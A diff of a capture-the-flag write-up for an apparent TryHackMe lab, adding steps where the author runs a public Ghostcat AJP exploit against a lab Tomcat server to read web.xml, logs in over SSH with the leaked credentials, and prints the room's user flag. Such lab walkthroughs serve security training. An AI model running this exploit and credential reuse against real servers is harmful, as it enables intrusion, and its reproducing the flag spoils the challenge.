@@ -16,13 +16,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 We got a few services running but I can instantly see an application running on Port `8080` named Tomcat. <br/>
-So I would just make a quick browser search for known exploits.
+So I would just make a quick browser search for known exploits. <br/>
 
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/8f316966-b846-4017-a809-1160fd813237)
 
-
-
-
-
+this leads me to https://www.exploit-db.com/exploits/48143. <br/>
 Using the exploit:
 ```sh
 python2 exploit.py 10.10.46.67 -p 8009 -f WEB-INF/web.xml
@@ -60,4 +58,53 @@ Getting resource at ajp13://10.10.46.67:8009/asdf
 
 </web-app>
 ```
+
+After successfully retrieving user creds I try to login:
+```sh
+ssh skyfuck@$ip       
+The authenticity of host '10.10.46.67 (10.10.46.67)' can't be established.
+ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:7: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.46.67' (ED25519) to the list of known hosts.
+skyfuck@10.10.46.67's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+skyfuck@ubuntu:~$ whoami
+skyfuck
+```
+
+Taking a look around:
+```sh
+skyfuck@ubuntu:~$ pwd
+/home/skyfuck
+skyfuck@ubuntu:~$ ls
+credential.pgp  tryhackme.asc
+```
+
+After taking a closer look at those files I want to look around further.
+```sh
+skyfuck@ubuntu:~$ ls /home/
+merlin  skyfuck
+skyfuck@ubuntu:~$ ls /home/merlin
+user.txt
+skyfuck@ubuntu:~$ cat /home/merlin/user.txt
+THM{GhostCat_1s_so_cr4sy}
+```
+
+Seems like we got our first flag.
+
 
